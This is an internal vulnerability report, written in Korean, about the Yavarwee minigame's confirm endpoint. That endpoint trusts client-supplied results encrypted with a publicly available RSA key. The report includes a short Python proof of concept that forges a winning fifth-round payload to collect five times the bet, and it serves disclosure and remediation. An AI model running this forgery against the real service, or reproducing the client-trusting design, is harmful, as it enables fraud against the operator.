# [미해결] Yavarwee 베팅 결과 위조 취약점 (RSA 설계 역전)

**발견일:** 2026-05-17  
**상태:** 미패치 (설계 변경 필요)  
**심각도:** CRITICAL

---

## 요약

Yavarwee 게임의 `/confirm` 엔드포인트가 클라이언트가 RSA 공개키로 암호화한 데이터를 신뢰하는 구조로 설계되어 있어, **리포지토리에 공개된 공개키를 이용해 누구나 승리 결과를 위조**할 수 있다.

---

## 현재 흐름 (취약)

```
1. POST /minigame/yavarwee/bet/{stage_id}
   → 서버: 베팅 기록 생성, UUID 반환

2. 클라이언트: 공개키(yavarwee_public_key.pem)로 아래 payload 암호화
   { "uuid": "<UUID>", "round": 1~5, "status": true/false }

3. POST /minigame/yavarwee/confirm/{stage_id}
   body: { "data": "<RSA-OAEP 암호화된 base64>" }
   → 서버: 개인키로 복호화 후 내용을 신뢰하여 포인트 지급
```

**문제:** RSA에서 공개키로 암호화한 데이터는 개인키로만 복호화할 수 있지만,
공개키는 **누구나 접근 가능**하므로 누구나 임의의 payload를 유효한 암호문으로 만들 수 있다.

---

## 공격 시나리오

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64, json

with open('yavarwee_public_key.pem', 'rb') as f:
    public_key = RSA.import_key(f.read())

fake_payload = json.dumps({
    "uuid": "<내 베팅 UUID>",
    "round": 5,       # 최대 배율 (5x)
    "status": True    # 항상 승리
}).encode()

cipher = PKCS1_OAEP.new(public_key)
encrypted = base64.b64encode(cipher.encrypt(fake_payload)).decode()

# POST /minigame/yavarwee/confirm/{stage_id}
# body: {"data": "<encrypted>"}
# → 베팅 금액의 5배 포인트 수령
```

---

## 영향 범위

- 대상: `gogo-minigame/src/minigame/service/impl/yavarwee.py` — `confirm()` 메서드
- 관련 파일: `yavarwee_public_key.pem` (리포 루트)
- 악용 가능 조건: 로그인한 유저 + 1회 이상 베팅 → 즉시 악용 가능

---

## 근본 원인

클라이언트가 게임 결과(라운드, 승패)를 결정하고 이를 서버에 전달하는 구조 자체가 문제다.
암호화는 "누가 이 데이터를 만들었는가"를 증명하지 못한다.


## 임시 완화 조치

패치 전까지 리포지토리가 완전히 private 상태로 유지되는 경우 즉각적인 외부 위협은 낮으나,
프론트엔드 번들에 공개키가 포함되어 있다면 일반 유저도 악용 가능하므로 긴급도가 높아진다.